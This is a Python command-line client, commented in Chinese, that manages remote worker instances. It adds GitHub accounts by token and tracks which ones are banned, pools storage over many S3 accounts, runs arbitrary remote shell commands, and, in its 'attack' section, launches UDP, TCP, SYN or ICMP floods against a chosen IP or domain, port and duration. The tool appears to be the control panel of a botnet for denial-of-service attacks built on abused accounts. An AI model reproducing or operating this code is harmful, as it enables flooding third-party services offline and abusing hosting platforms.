# -*- coding: utf-8 -*-
"""
管理操作（实例/账号/任务/日志/S3/进程/备份/攻击）

全部重写：按类别分组 + rich 美化 + 统一错误处理
"""
import time
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.rule import Rule
from cli import api, config

console = Console()


# ==================== 工具函数 ====================

def _input(prompt):
    try:
        val = input(prompt).strip()
        return val if val else None
    except (KeyboardInterrupt, EOFError):
        return None


def _err(msg):
    console.print(f"  ✗ {msg}", style="red")

def _ok(msg):
    console.print(f"  ✓ {msg}", style="green")

def _warn(msg):
    console.print(f"  ! {msg}", style="yellow")

def _info(msg):
    console.print(f"  ℹ {msg}", style="cyan")


def pick_instance(running_only=True):
    """选择实例，返回 instance dict 或 None"""
    d = api.get("/api/instances")
    ok, data = api.check(d)
    if not ok:
        _err(f"无法获取实例列表: {data}")
        return None
    insts = data.get("instances", [])
    if running_only:
        insts = [i for i in insts if i.get("status") in ("running", "starting", "restarting")]
    if not insts:
        console.print("  没有可用实例", style="dim")
        return None
    for idx, i in enumerate(insts):
        status = i.get("status", "")
        color = {"running": "green", "restarting": "yellow", "starting": "cyan"}.get(status, "white")
        console.print(f"  [{idx}] {i['id']} -> {i.get('url', '')} ", style=color, end="")
        console.print(f"({status})", style=color)
    sel = _input("\n  选择实例序号（留空取消）: ")
    if sel is None:
        return None
    try:
        return insts[int(sel)]
    except (ValueError, IndexError):
        _err("无效选择")
        return None


# ==================== 实例操作 ====================

def list_instances():
    d = api.get("/api/instances")
    ok, data = api.check(d)
    if not ok:
        _err(f"无法连接 Manager: {data}")
        return
    insts = data.get("instances", [])
    if not insts:
        console.print("  暂无实例", style="dim")
        return
    t = Table(title="实例列表", show_header=True, header_style="bold cyan")
    t.add_column("ID", style="bold")
    t.add_column("域名")
    t.add_column("状态")
    t.add_column("账号")
    t.add_column("MCP")
    for i in insts:
        status = i.get("status", "")
        st = {"running": "[green]运行中[/]", "restarting": "[yellow]重启中[/]",
              "starting": "[cyan]启动中[/]", "failed": "[red]失败[/]"}.get(status, status)
        mcp = "✓" if i.get("mcp_url") else "✗"
        t.add_row(i["id"], i.get("hostname", ""), st, i.get("account", ""), mcp)
    console.print(t)


def create_instance():
    d = api.get("/api/accounts")
    ok, data = api.check(d)
    if not ok:
        _err(f"无法获取账号列表: {data}")
        return
    accounts = data.get("accounts", [])
    if not accounts:
        _err("没有可用账号，请先添加账号")
        return
    console.print("  可用账号:")
    for idx, a in enumerate(accounts):
        console.print(f"    [{idx}] {a['name']} ({a.get('repo', '')})")
    console.print("    [auto] 自动选择最优账号")
    sel = _input("\n  选择账号（序号/auto，留空取消）: ")
    if sel is None:
        return
    payload = {}
    if sel.lower() != "auto":
        try:
            payload = {"account": accounts[int(sel)]["name"]}
        except (ValueError, IndexError):
            _warn("无效选择，使用自动选择")
    console.print("\n  [cyan]正在创建新实例（隧道+MCP+启动）...[/]")
    d = api.post("/api/instances", payload)
    ok, data = api.check(d)
    if ok:
        inst = data.get("instance", {})
        _ok(f"创建成功: {inst.get('id')} -> {inst.get('url')}")
        if inst.get("mcp_url"):
            _info(f"MCP: {inst.get('mcp_url')}")
        host = inst.get("hostname", "")
        if host:
            console.print("  [dim]等待实例就绪...[/]")
            for attempt in range(60):
                r = api.get_url(f"https://{host}/api/health", timeout=10)
                if r.get("ok"):
                    _ok(f"实例已就绪（{attempt*5}秒）")
                    break
                time.sleep(5)
            else:
                _warn(f"实例暂未就绪，可用 ghss --json wait {inst.get('id')} 检查")
    else:
        _err(f"创建失败: {data}")


def restart_instance():
    """优雅重启实例"""
    inst = pick_instance()
    if not inst:
        return
    inst_id = inst["id"]
    console.print(f"\n  [yellow]正在重启 {inst_id}（备份→退出→新实例启动）...[/]")
    d = api.post(f"/api/instances/{inst_id}/restart")
    ok, data = api.check(d)
    if ok:
        _ok(f"{inst_id} 正在重启，状态: {data.get('status', 'restarting')}")
        _info("Manager 会自动监控新实例启动，约1-2分钟")
    else:
        _err(f"重启失败: {data}")


def close_instance():
    inst = pick_instance(running_only=False)
    if not inst:
        return
    inst_id = inst["id"]
    d = api.delete(f"/api/instances/{inst_id}")
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "已关闭"))
    else:
        _err(data)


# ==================== 账号操作 ====================

def list_accounts():
    d = api.get("/api/accounts")
    ok, data = api.check(d)
    if not ok:
        _err(f"无法获取账号列表: {data}")
        return
    accounts = data.get("accounts", [])
    if not accounts:
        console.print("  暂无账号", style="dim")
        return
    t = Table(title="账号列表", show_header=True, header_style="bold cyan")
    t.add_column("名称", style="bold")
    t.add_column("仓库")
    t.add_column("并发上限")
    for a in accounts:
        t.add_row(a["name"], a.get("repo", ""), str(a.get("max_concurrency", "")))
    console.print(t)


def add_account():
    console.print("  [dim]（全自动：验证token→fork→secrets→报备）[/]")
    name = _input("  账号名称（留空取消）: ")
    if name is None:
        return
    token = _input("  GitHub Token（留空取消）: ")
    if token is None:
        return
    d = api.post("/api/accounts", {"name": name, "token": token})
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "成功"))
    else:
        _err(data)


def banned_accounts():
    d = api.get("/api/accounts/banned")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    banned = data.get("banned", [])
    if not banned:
        _ok("无被封账号")
        return
    t = Table(title=f"被封账号 ({len(banned)}个)")
    t.add_column("名称", style="bold")
    t.add_column("仓库")
    t.add_column("原因")
    for b in banned:
        t.add_row(b.get("name", "?"), b.get("repo", "?"), b.get("reason", "?"))
    console.print(t)


# ==================== 任务/日志/总览 ====================

def list_tasks():
    d = api.get("/api/tasks")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    tasks = data.get("tasks", [])
    if not tasks:
        console.print("  暂无任务", style="dim")
        return
    t = Table(title=f"任务队列 ({len(tasks)}个)")
    t.add_column("ID", style="dim")
    t.add_column("类型", style="bold")
    t.add_column("状态")
    t.add_column("重试")
    t.add_column("错误")
    for task in tasks[-20:]:
        st = task.get("status", "")
        color = {"done": "green", "pending": "yellow", "running": "cyan", "failed": "red"}.get(st, "white")
        t.add_row(task.get("id", "")[-12:], task.get("type", ""),
                  f"[{color}]{st}[/{color}]", str(task.get("retries", 0)),
                  (task.get("error", "") or "")[:30])
    console.print(t)


def view_logs():
    limit_str = _input("  查看最近多少行日志（默认300）: ")
    if limit_str is None:
        return
    try:
        limit = max(10, min(int(limit_str) if limit_str else 300, 2000))
    except ValueError:
        limit = 300
    d = api.get(f"/api/logs?limit={limit}")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    stats = data.get("stats", {})
    console.print(f"  统计: [red]错误 {stats.get('error', 0)}[/] | [yellow]警告 {stats.get('warning', 0)}[/]")
    console.print(Rule(style="dim"))
    for entry in data.get("logs", []):
        if isinstance(entry, dict):
            level = entry.get("level", "")
            color = {"ERROR": "red", "WARNING": "yellow"}.get(level, "white")
            console.print(f"  [{color}][{level}][/{color}] {entry.get('msg', '')}")


def overview():
    d = api.get("/api/overview")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    console.print(Panel(
        f"Leader: {data.get('leader')} | 运行: {data.get('elapsed')}s\n"
        f"账号: {len(data.get('accounts', []))} | 实例: {len(data.get('instances', []))}",
        title="总览", border_style="cyan"))
    wh = data.get("worker_health", {})
    console.print(f"  Worker: [green]在线 {wh.get('online', 0)}[/]/{wh.get('total', 0)}")
    s3 = data.get("s3", {})
    if s3.get("ready"):
        _ok(f"S3 就绪 | 账号 {s3.get('total_accounts', 0)} | 哈希环 {s3.get('hash_ring_size', 0)} | 存储 {s3.get('total_storage_mb', 0)}MB")
    else:
        _err("S3 未就绪")
    tasks = data.get("tasks", {})
    if tasks:
        console.print(f"  任务: " + " | ".join(f"{k}={v}" for k, v in tasks.items()))


def logs_follow():
    """日志实时跟随"""
    inst = pick_instance()
    if not inst:
        return
    console.print(f"  [cyan]跟随 {inst['id']} 日志（Ctrl+C 退出）...[/]")
    seen = 0
    try:
        while True:
            d = api.get(f"/api/instances/{inst['id']}/logs?limit=500")
            ok, data = api.check(d)
            if ok:
                logs = data.get("logs", [])
                new_logs = logs[seen:] if seen < len(logs) else []
                for entry in new_logs:
                    if isinstance(entry, dict):
                        console.print(f"  [{entry.get('level','')}] {entry.get('msg','')}")
                seen = len(logs)
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n  [dim]已停止[/]")


# ==================== S3 操作 ====================

def s3_status():
    d = api.get("/api/s3/status")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    ready = data.get("ready")
    console.print(f"  就绪: {'✓' if ready else '✗'}")
    console.print(f"  总账号: {data.get('total_accounts', 0)}")
    console.print(f"  活跃: [green]{data.get('active_accounts', 0)}[/]")
    console.print(f"  降级: [yellow]{data.get('degraded_accounts', 0)}[/]")
    console.print(f"  不可用: [red]{data.get('unavailable_accounts', 0)}[/]")
    console.print(f"  哈希环: {data.get('hash_ring_size', 0)}")
    console.print(Rule("全局统计", style="dim"))
    console.print(f"  A类操作: {data.get('total_a_ops', 0)}")
    console.print(f"  B类操作: {data.get('total_b_ops', 0)}")
    console.print(f"  存储用量: {data.get('total_storage_mb', 0)}MB")
    console.print(Rule("来源拆分", style="dim"))
    console.print(f"  Manager: A={data.get('manager_a_ops', 0)} B={data.get('manager_b_ops', 0)} 存储={data.get('manager_storage_mb', 0)}MB")
    w_cnt = data.get("worker_count", 0)
    if w_cnt:
        console.print(f"  Worker×{w_cnt}: A={data.get('worker_a_ops', 0)} B={data.get('worker_b_ops', 0)} 存储={data.get('worker_storage_mb', 0)}MB")


def s3_health():
    d = api.get("/api/s3/health")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    console.print(f"  活跃: [green]{data.get('active', 0)}[/] | 降级: [yellow]{data.get('degraded', 0)}[/] | 不可用: [red]{data.get('unavailable', 0)}[/] | 总计: {data.get('total', 0)}")


def s3_accounts():
    d = api.get("/api/s3/accounts")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    accts = data.get("accounts", [])
    if not accts:
        _ok(f"全部正常（{data.get('total', 0)} 个账号全部 active）")
        return
    t = Table(title=f"非 active 账号（{data.get('total_non_active', 0)}个）")
    t.add_column("序号", style="dim")
    t.add_column("状态")
    t.add_column("A类")
    t.add_column("B类")
    t.add_column("存储MB")
    t.add_column("失败")
    t.add_column("错误")
    for a in accts:
        st = a.get("status", "")
        color = {"degraded": "yellow", "unavailable": "red"}.get(st, "white")
        t.add_row(str(a["idx"]), f"[{color}]{st}[/{color}]", str(a["a_count"]),
                  str(a["b_count"]), str(a["used_mb"]), str(a["fail_count"]),
                  (a.get("last_error", "") or "")[:40])
    console.print(t)


def s3_workers():
    d = api.get("/api/s3/workers")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    workers = data.get("workers", [])
    console.print(f"\n  Worker S3状态 ({data.get('total', 0)}个):")
    for w in workers:
        seen = time.strftime("%H:%M:%S", time.localtime(w.get("last_seen", 0)))
        console.print(f"\n  [bold]{w['instance']}[/]:")
        console.print(f"    S3: active={w.get('active',0)} degraded={w.get('degraded',0)} unavailable={w.get('unavailable',0)}")
        console.print(f"    操作: A={w.get('a_ops_total',0)} B={w.get('b_ops_total',0)} 存储={w.get('storage_mb',0)}MB")
        console.print(f"    进程: {w.get('procs',0)} 磁盘: {w.get('disk_pct',0)}% 最后上报: {seen}")


def backup_history(inst_id):
    d = api.get(f"/api/instances/{inst_id}/backup-history")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    history = data.get("history", [])
    console.print(f"\n  备份历史 ({len(history)}条):")
    for h in history[:20]:
        ts = time.strftime("%m-%d %H:%M:%S", time.localtime(h.get("timestamp", 0)))
        status = h.get("status", "?")
        size_mb = round(h.get("size_bytes", 0) / 1048576, 1) if h.get("size_bytes") else 0
        st = f"[green]{status}[/]" if status == "success" else f"[red]{status}[/]"
        console.print(f"  {ts} [{st}] {size_mb}MB A={h.get('a_delta',0)} B={h.get('b_delta',0)}")
        if h.get("log"):
            console.print(f"    [dim]{h['log'][:80]}[/]")


def restore_history(inst_id):
    d = api.get(f"/api/instances/{inst_id}/restore-history")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    history = data.get("history", [])
    console.print(f"\n  恢复历史 ({len(history)}条):")
    for h in history[:20]:
        ts = time.strftime("%m-%d %H:%M:%S", time.localtime(h.get("timestamp", 0)))
        console.print(f"  {ts} [{h.get('status','')}] A={h.get('a_delta',0)} B={h.get('b_delta',0)}")


def timeline(inst_id):
    d = api.get(f"/api/instances/{inst_id}/timeline")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    tl = data.get("timeline", [])
    console.print(f"\n  时间线 ({len(tl)}条):")
    for e in tl[:30]:
        ts = time.strftime("%m-%d %H:%M:%S", time.localtime(e.get("timestamp", 0)))
        console.print(f"  {ts} [{e.get('type','')}] [{e.get('status','')}] {round(e.get('size_bytes',0)/1048576,1) if e.get('size_bytes') else ''}")


def worker_stats(inst_id):
    d = api.get(f"/api/instances/{inst_id}/stats")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    console.print(Panel(
        f"A类总次数: {data.get('a_count_total', 0)}\n"
        f"B类总次数: {data.get('b_count_total', 0)}\n"
        f"存储用量: {data.get('storage_mb', 0)}MB\n"
        f"进程数: {data.get('procs', 0)}  磁盘: {data.get('disk_pct', 0)}%",
        title=f"{inst_id} 统计", border_style="cyan"))


# ==================== 进程操作 ====================

def list_processes():
    inst = pick_instance()
    if not inst:
        return
    d = api.get_inst(inst["hostname"], "/api/processes")
    ok, data = api.check(d)
    if not ok:
        _err(data.get("error", data) if isinstance(data, dict) else str(data))
        return
    procs = data.get("processes", [])
    if not procs:
        console.print("  暂无持久化进程", style="dim")
        return
    t = Table(title="进程列表")
    t.add_column("名称", style="bold")
    t.add_column("PID")
    t.add_column("状态")
    t.add_column("命令")
    t.add_column("隧道")
    for p in procs:
        running = p.get("running")
        st = "[green]运行[/]" if running else "[red]停止[/]"
        tunnels = p.get("tunnels", [])
        t_count = f"{sum(1 for t in tunnels if t.get('running'))}/{len(tunnels)}" if tunnels else "-"
        t.add_row(p.get("name", ""), str(p.get("pid", "")), st,
                  (p.get("cmdline", "") or "")[:30], t_count)
    console.print(t)


def snapshot_processes():
    inst = pick_instance()
    if not inst:
        return
    d = api.post_inst(inst["hostname"], "/api/processes/snapshot", {"token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(f"快照完成，持久化 {data.get('saved', 0)} 个进程")
    else:
        _err(data.get("error", data.get("msg", str(data))))


def start_process():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    d = api.post_inst(inst["hostname"], f"/api/processes/{name}/start", {"token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "已启动"))
    else:
        _err(data.get("error", data.get("msg", str(data))))


def stop_process():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    d = api.post_inst(inst["hostname"], f"/api/processes/{name}/stop", {"token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "已停止"))
    else:
        _err(data.get("error", data.get("msg", str(data))))


def restart_process():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    d = api.post_inst(inst["hostname"], f"/api/processes/{name}/restart", {"token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "已重启"))
    else:
        _err(data.get("error", data.get("msg", str(data))))


def process_log():
    inst = pick_instance()
    if not inst:
        return
    name = _input("  进程名称（留空取消）: ")
    if name is None:
        return
    limit_str = _input("  行数（默认200）: ") or "200"
    try:
        limit = max(10, min(int(limit_str), 2000))
    except ValueError:
        limit = 200
    d = api.get_inst(inst["hostname"], f"/api/processes/{name}/log?limit={limit}&token={config.TOKEN}")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    lines = data.get("lines", [])
    if not lines:
        console.print("  无日志", style="dim")
        return
    for line in lines[-limit:]:
        console.print(f"  {line.rstrip()}")


# ==================== 备份/执行/资源 ====================

def backup_now():
    inst = pick_instance()
    if not inst:
        return
    console.print("  [cyan]正在备份（数据库+文件+进程快照+S3状态）...[/]")
    d = api.post_inst(inst["hostname"], "/api/backup/now", {"token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(f"备份完成: db={data.get('db_size', 0)}B files={data.get('files_size', 0)}B 耗时={data.get('elapsed', 0)}s")
    else:
        _err(data)


def exec_cmd():
    inst = pick_instance()
    if not inst:
        return
    cmd = _input("  输入命令（留空取消）: ")
    if cmd is None:
        return
    timeout_str = _input("  超时秒数（默认30）: ") or "30"
    try:
        timeout = max(1, min(int(timeout_str), 600))
    except ValueError:
        timeout = 30
    d = api.post(f"/api/instances/{inst['id']}/exec", {"cmd": cmd, "timeout": timeout})
    r = d.get("result") or d
    if r.get("ok"):
        out = r.get("stdout", "")
        if out:
            print(out, end="")
        err = r.get("stderr", "")
        if err:
            console.print(f"  [dim][stderr] {err}[/]")
        console.print(f"  [dim][exit={r.get('code', '?')}]")
    else:
        _err(d.get("error", r.get("error", str(d))))


def exec_batch():
    inst = pick_instance()
    if not inst:
        return
    console.print("  输入命令（每行一条，空行结束）:")
    cmds = []
    while True:
        cmd = _input(f"  cmd{len(cmds)+1}> ")
        if cmd is None:
            break
        cmds.append(cmd)
    if not cmds:
        return
    for cmd in cmds:
        console.print(f"\n  [cyan]>> {cmd}[/]")
        d = api.post(f"/api/instances/{inst['id']}/exec", {"cmd": cmd, "timeout": 30})
        r = d.get("result") or d
        if r.get("ok"):
            out = r.get("stdout", "")
            if out:
                print(out, end="")
            console.print(f"  [dim][exit={r.get('code', '?')}]")
        else:
            _err(d.get("error", r.get("error", str(d))))


def resource_monitor():
    inst = pick_instance()
    if not inst:
        return
    d = api.get_inst(inst["hostname"], "/api/resource")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    console.print(f"  内存: {data.get('mem_avail_kb', 0) // 1024}MB 可用 / {data.get('mem_total_kb', 0) // 1024}MB 总计")
    console.print(f"  磁盘: {data.get('disk_used_kb', 0) // 1024}MB / {data.get('disk_total_kb', 0) // 1024}MB ({data.get('disk_use_pct', 0)}%)")
    console.print(f"  运行: {data.get('elapsed', 0)}s")


# ==================== 攻击操作 ====================

def attack_start():
    inst = pick_instance()
    if not inst:
        return
    target = _input("  目标 IP/域名（留空取消）: ")
    if target is None:
        return
    atype = _input("  类型（udp/tcp/syn/icmp，默认udp）: ") or "udp"
    port_str = _input("  端口（默认80）: ") or "80"
    dur_str = _input("  持续秒数（默认60）: ") or "60"
    try:
        port, dur = int(port_str), int(dur_str)
    except ValueError:
        _err("无效数字")
        return
    d = api.post_inst(inst["hostname"], "/api/attack/start",
                      {"target": target, "type": atype, "port": port,
                       "duration": dur, "token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "已启动"))
    else:
        _err(data.get("error", data.get("msg", str(data))))


def attack_stop():
    inst = pick_instance()
    if not inst:
        return
    d = api.post_inst(inst["hostname"], "/api/attack/stop", {"token": config.TOKEN})
    ok, data = api.check(d)
    if ok:
        _ok(data.get("msg", "已停止"))
    else:
        _err(data.get("msg", str(data)))


def attack_status():
    inst = pick_instance()
    if not inst:
        return
    d = api.get_inst(inst["hostname"], "/api/attack/status")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    console.print(f"  运行: {data.get('running')} | 模式: {data.get('mode')} | 开始: {data.get('started_at')}")
    stats = data.get("stats", {})
    if stats:
        console.print(f"  统计: {stats}")


# ==================== 代理操作（通过 manager 查看 worker）====================

def proxy_logs():
    inst = pick_instance()
    if not inst:
        return
    d = api.get(f"/api/instances/{inst['id']}/logs?limit=50")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    for entry in data.get("logs", []):
        if isinstance(entry, dict):
            ts = entry.get("time", 0)
            bj = time.strftime("%H:%M:%S", time.localtime(ts)) if ts else ""
            console.print(f"  {bj} [{entry.get('level', '')}] {entry.get('msg', '')[:80]}")


def proxy_processes():
    inst = pick_instance()
    if not inst:
        return
    d = api.get(f"/api/instances/{inst['id']}/processes")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    procs = data.get("processes", [])
    if not procs:
        console.print("  暂无进程", style="dim")
        return
    for p in procs:
        st = "[green]运行[/]" if p.get("running") else "[red]停止[/]"
        console.print(f"  {p.get('name', ''):<20} pid={p.get('pid')} {st}")


def proxy_resource():
    inst = pick_instance()
    if not inst:
        return
    d = api.get(f"/api/instances/{inst['id']}/resource")
    ok, data = api.check(d)
    if not ok:
        _err(data)
        return
    console.print(f"  内存: {data.get('mem_avail_kb', 0) // 1024}MB / {data.get('mem_total_kb', 0) // 1024}MB")
    console.print(f"  磁盘: {data.get('disk_used_kb', 0) // 1024}MB / {data.get('disk_total_kb', 0) // 1024}MB ({data.get('disk_use_pct', 0)}%)")
    console.print(f"  运行: {data.get('elapsed', 0)}s")
